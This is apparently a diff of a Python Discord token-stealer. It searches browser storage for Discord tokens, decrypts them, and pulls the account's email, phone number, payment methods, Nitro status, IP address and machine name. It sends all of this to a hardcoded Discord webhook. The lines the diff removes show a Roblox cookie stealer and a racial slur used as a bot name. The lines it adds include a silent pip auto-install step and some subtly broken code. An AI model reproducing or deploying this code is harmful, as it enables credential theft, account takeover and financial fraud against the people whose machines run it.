@@ -1,6 +1,6 @@
-import random
-import string
 import os
+if os.name != "nt":
+    exit()
 import subprocess
 import sys
 import json
@@ -8,24 +8,20 @@ import urllib.request
 import re
 import base64
 import datetime
-import shutil
-import sqlite3
 import requests
-import tempfile
-import platform
-import psutil
-import GPUtil
-import socket
-import getpass
-import threading
-import time
-import keyboard
-import ctypes
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
 import win32crypt
 from Crypto.Cipher import AES
-from pynput import mouse, keyboard as pynput_keyboard
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -47,12 +43,14 @@ PATHS = {
     'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
     'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
     'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
     'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
     'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"  # Replace with your actual webhook URL
 
 def getheaders(token=None):
     headers = {
@@ -79,7 +77,7 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*]*$", line):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$$'(.*)'$$.*$][^\"]*", line):
                         tokens.append(values)
         except PermissionError:
             continue
@@ -95,35 +93,13 @@ def getkey(path):
 
 def getipwhois_data():
     try:
-        with urllib.request.urlopen("https://ipwhois.app/json/") as response:
+        with urllib.request.urlopen("https://ipwho.is/json/") as response:
             return json.loads(response.read().decode())
     except Exception as e:
         return {"error": str(e)}
 
-def retrieve_roblox_cookies():
-    user_profile = os.getenv("USERPROFILE", "")
-    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
-
-    temp_dir = os.getenv("TEMP", "")
-    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
-    shutil.copy(roblox_cookies_path, destination_path)
-
-    try:
-        with open(destination_path, 'r', encoding='utf-8') as file:
-            file_content = json.load(file)
-
-        encoded_cookies = file_content.get("CookiesData", "")
-
-        decoded_cookies = base64.b64decode(encoded_cookies)
-        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
-
-        return decrypted_text
-    except Exception as e:
-        return f"Error retrieving Roblox cookies: {e}"
-
-def send_to_discord(message):
-    payload = {"content": message}
+def send_to_discord(embed):
+    payload = {"embeds": [embed]}
     response = requests.post(WEBHOOK_URL, json=payload)
     if response.status_code == 204:
         print("Message sent successfully!")
@@ -183,21 +159,19 @@ def main():
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    if res[0]["current_period_end"] is not None:
-                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
                 res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
                 print_boost = ""
                 boost = False
                 for id in res:
-                    if id["cooldown_ends_at"] is not None:
-                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                            print_boost += f"ㅤ- Available now\n"
-                            available += 1
-                        else:
-                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                     boost = True
                 if boost:
                     badges += f":BadgeBoost: "
@@ -217,37 +191,29 @@ def main():
                             valid += 1
                         payment_methods += 1
 
-                ip_data = getipwhois_data()
                 print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                ip_data = getipwhois_data()
                 embed_user = {
-                    'embeds': [
-                        {
-                            'title': f"**New user data: {res_json['username']}**",
-                            'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}IP Info:```yaml\nIP: {ip_data.get("ip")}\nMore details: https://ipwho.is/{ip_data.get("ip")}```System Info:```yaml\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
-                            'color': 3092790,
-                            'footer': {
-                                'text': "Made by Ryzen"
-                            },
-                            'thumbnail': {
-                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
-                            }
-                        }
-                    ],
-                    "username": "Nigga Logger",
+                    'title': f"**New user data: {res_json['username']}**",
+                    'description': f"""
+                        ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {ip_data.get("ip")}\nMore details: https://ipwho.is/{ip_data.get("ip")}```yaml\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                    'color': 3092790,
+                    'footer': {
+                        'text': "Made by Astraa ・ https://github.com/astraadev"
+                    },
+                    'thumbnail': {
+                        'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                    }
                 }
 
-                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                send_to_discord(embed_user)
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
                 print(f"ERROR: {e}")
                 continue
-
-    roblox_cookies = retrieve_roblox_cookies()
-    send_to_discord(f"Decrypted Roblox Cookies:\n```\n{roblox_cookies}\n```")
 
 if __name__ == "__main__":
     main()
